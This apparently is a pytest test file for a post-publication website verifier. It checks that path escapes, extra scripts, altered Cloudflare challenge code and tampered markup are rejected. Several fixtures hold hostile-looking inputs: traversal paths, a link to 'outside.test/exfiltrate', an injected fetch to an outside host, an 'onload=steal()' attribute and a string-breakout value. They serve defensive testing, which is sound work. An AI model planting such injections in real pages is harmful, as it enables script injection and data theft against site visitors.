"""Negative boundaries for the post-publication Site verifier; no network calls."""
import importlib.util
from pathlib import Path
import subprocess
import urllib.request

import pytest

SPEC = importlib.util.spec_from_file_location('site_public_v3', Path(__file__).resolve().parents[1] / 'scripts/verify_publication_v3.py')
v = importlib.util.module_from_spec(SPEC)
SPEC.loader.exec_module(v)


@pytest.mark.parametrize('path', ['../private', '/../../private', '/assets/../private', '/assets\\private', '/assets/x?token=secret', '/assets/x#fragment'])
def test_source_path_rejects_escape_and_embedded_queries(tmp_path, path):
    (tmp_path / 'public').mkdir()
    with pytest.raises(ValueError):
        v.source_path(tmp_path, path)


@pytest.mark.parametrize('size,sha', [(True, 'a' * 64), (0, 'a' * 64), (v.legacy.MAX_RESPONSE_BYTES + 1, 'a' * 64), (1, 'A' * 64), (1, 'missing')])
def test_exact_expectations_require_positive_bounded_length_and_sha(size, sha):
    with pytest.raises(ValueError):
        v.exact_target('/asset.zip', size, sha)


def test_anonymous_request_has_no_cookies_or_authentication(monkeypatch):
    monkeypatch.setenv('HTTPS_PROXY', 'https://127.0.0.1:1')
    request = v.legacy.anonymous_request(v.SITE + '/assets/airspace-project.css')
    assert not {'authorization', 'cookie', 'proxy-authorization'} & {name.casefold() for name in request.headers}
    opener = v.legacy.anonymous_opener(v.legacy.RestrictedRedirects(1e20))
    assert not any(isinstance(h, (urllib.request.HTTPBasicAuthHandler, urllib.request.HTTPCookieProcessor, urllib.request.ProxyBasicAuthHandler)) for h in opener.handlers)
    assert all(not h.proxies for h in opener.handlers if isinstance(h, urllib.request.ProxyHandler))


def test_semantic_source_comparison_rejects_missing_actual_download():
    content = b'<html><body>System Lab Airspace Operations 0.3.0-rc.1 Published <a href="/airspace-operations/releases/0.3.0-rc.1/System-Lab-Airspace-Operations-0.3.0-rc.1.zip">Download</a></body></html>'
    target = {'path': '/projects/airspace-operations', '_source': content}
    changed = content.replace(b'<a href=', b'<span data-inactive=').replace(b'</a>', b'</span>')
    checks = v.semantic_checks(target, changed)
    assert not checks['candidate_download_link']
    assert not checks['source_links_equal']


def test_semantic_source_comparison_rejects_unsupported_claim_without_changing_links():
    content = b'<html><body>System Lab <a href="/projects/airspace-operations">Project</a></body></html>'
    target = {'path': '/', '_source': content}
    checks = v.semantic_checks(target, content.replace(b'System Lab', b'Certified complete European coverage'))
    assert not checks['visible_text_matches_source']
    assert checks['existing_airspace_link']


def test_expected_paths_bind_to_public_directory_and_existing_resource(tmp_path):
    public = tmp_path / 'public'
    public.mkdir()
    (public / 'index.html').write_text('Actual source')
    assert v.source_path(tmp_path, '/') == public / 'index.html'
    with pytest.raises(ValueError):
        v.source_path(tmp_path, '/missing.html')


def hosting_sample(ray: bytes, timestamp: bytes, literal_ray: bytes | None = None) -> bytes:
    literal_ray = literal_ray or ray
    return (b"<script>window.__CF$cv$params={r:'" + ray + b"',t:'" + timestamp + b"'};"
            b"var u='/cdn-cgi/challenge-platform/scripts/jsd/main.js?ray=" + literal_ray + b"',a=document.createElement('script');</script>")


def test_only_matching_observed_cloudflare_ray_is_normalised():
    first = hosting_sample(b'a528c6502df90dff', b'MTc5MzM0NjA1NQ==')
    second = hosting_sample(b'a528c6513a5bed44', b'MTc5MzM0NjA1Ng==')
    assert v.normalise_hosting_parameters(first) == v.normalise_hosting_parameters(second)


def test_inconsistent_hosting_ray_and_unrelated_authored_queries_remain_visible():
    first = hosting_sample(b'a528c6502df90dff', b'MTc5MzM0NjA1NQ==', b'1111111111111111')
    second = hosting_sample(b'a528c6513a5bed44', b'MTc5MzM0NjA1Ng==', b'2222222222222222')
    assert v.normalise_hosting_parameters(first) != v.normalise_hosting_parameters(second)
    assert v.normalise_hosting_parameters(b'<a href="/report?ray=1111111111111111">Evidence</a>') != v.normalise_hosting_parameters(b'<a href="/report?ray=2222222222222222">Evidence</a>')


def test_authored_content_changes_survive_hosting_normalisation():
    first = b'<p>Missing evidence</p>' + hosting_sample(b'a528c6502df90dff', b'MTc5MzM0NjA1NQ==')
    second = b'<p>Approved</p>' + hosting_sample(b'a528c6513a5bed44', b'MTc5MzM0NjA1Ng==')
    assert v.normalise_hosting_parameters(first) != v.normalise_hosting_parameters(second)


def source_page() -> bytes:
    return b'<html><body>System Lab <a href="/projects/airspace-operations">Project</a></body></html>'


def observed_injection(ray=b'a528c6502df90dff', timestamp=b'MTc5MzM0NjA1NQ==') -> bytes:
    body = v.OBSERVED_CF_SCRIPT.replace(b'REQUEST_ID', ray).replace(b'TIMESTAMP', timestamp)
    return b'<script>' + body + b'</script>'


def test_complete_observed_injection_is_the_only_allowed_extra_active_content():
    source = source_page()
    target = {'path': '/', '_source': source}
    actual = source.replace(b'</body>', observed_injection() + b'</body>')
    assert all(v.semantic_checks(target, actual).values())
    assert v.remove_observed_hosting_injection(actual) == source


@pytest.mark.parametrize('extra', [
    b'<a href="https://outside.test/exfiltrate"></a>',
    b'<img src="https://outside.test/pixel">',
    b'<script>window.location="https://outside.test";</script>',
    b'<script src="https://outside.test/runtime.js"></script>',
    b'<style>body{display:none}</style>',
])
def test_stable_extra_links_images_scripts_or_styles_are_rejected(extra):
    source = source_page()
    target = {'path': '/', '_source': source}
    actual = source.replace(b'</body>', extra + observed_injection() + b'</body>')
    checks = v.semantic_checks(target, actual)
    assert not checks['authored_html_matches_source_after_observed_hosting_injection']
    assert not all(checks.values())


@pytest.mark.parametrize('old,new', [
    (b'<body>', b'<body onload="steal()">'),
    (b'<body>', b'<body hidden>'),
    (b'>Project</a>', b' aria-hidden="true">Project</a>'),
])
def test_unchanged_extracted_text_does_not_hide_markup_or_event_attribute_changes(old, new):
    source = source_page()
    actual = source.replace(old, new)
    checks = v.semantic_checks({'path': '/', '_source': source}, actual)
    assert checks['visible_text_matches_source']
    assert not checks['authored_html_matches_source_after_observed_hosting_injection']


@pytest.mark.parametrize('change', ['different-ray', 'code-change', 'attributes', 'duplicate', 'invalid-time', 'injected-time'])
def test_cloudflare_exception_rejects_any_unobserved_script_or_parameter_change(change):
    source = source_page()
    injection = observed_injection()
    if change == 'different-ray':
        injection = injection.replace(b'?ray=a528c6502df90dff', b'?ray=1111111111111111')
    elif change == 'code-change':
        injection = injection.replace(b'if(document.body)', b'fetch("https://outside.test");if(document.body)')
    elif change == 'attributes':
        injection = injection.replace(b'<script>', b'<script data-altered="yes">', 1)
    elif change == 'duplicate':
        injection += injection
    elif change == 'invalid-time':
        injection = observed_injection(timestamp=b'not-a-base64-timestamp')
    else:
        injection = observed_injection(timestamp=b'\");steal();var x="')
    checks = v.semantic_checks({'path': '/', '_source': source}, source.replace(b'</body>', injection + b'</body>'))
    assert not checks['source_scripts_styles_match']
    assert not checks['authored_html_matches_source_after_observed_hosting_injection']


def test_existing_authored_scripts_and_styles_must_match_exactly_in_order_and_content():
    source = source_page().replace(b'</body>', b'<script src="/app.js"></script><style>body{color:black}</style></body>')
    target = {'path': '/', '_source': source}
    assert all(v.semantic_checks(target, source.replace(b'</body>', observed_injection() + b'</body>')).values())
    changed = source.replace(b'/app.js', b'/unreviewed.js')
    assert not v.semantic_checks(target, changed)['source_scripts_styles_match']
    changed = source.replace(b'color:black', b'display:none')
    assert not v.semantic_checks(target, changed)['source_scripts_styles_match']


@pytest.mark.parametrize('change', ['tracked-content', 'new-public-file', 'different-deployed-commit'])
def test_actual_git_source_gate_rejects_changed_public_snapshot_without_erasing_it(tmp_path, change):
    def git(*args):
        return subprocess.run(['git', *args], cwd=tmp_path, capture_output=True, text=True, check=True).stdout.strip()
    git('init')
    public = tmp_path / 'public'
    public.mkdir()
    original = public / 'index.html'
    original.write_text('Committed source')
    git('add', 'public/index.html')
    git('-c', 'user.name=Isolated verifier test', '-c', 'user.email=verifier@test.invalid', 'commit', '-m', 'Isolated source snapshot')
    head = git('rev-parse', 'HEAD')
    assert v.assert_deployment_source(tmp_path, head) == head
    if change == 'tracked-content':
        original.write_text('Preserve this newer source')
    elif change == 'new-public-file':
        (public / 'new.html').write_text('Preserve this new source')
    else:
        head = 'f' * 40
    with pytest.raises(ValueError):
        v.assert_deployment_source(tmp_path, head)
    assert original.read_text() == ('Preserve this newer source' if change == 'tracked-content' else 'Committed source')
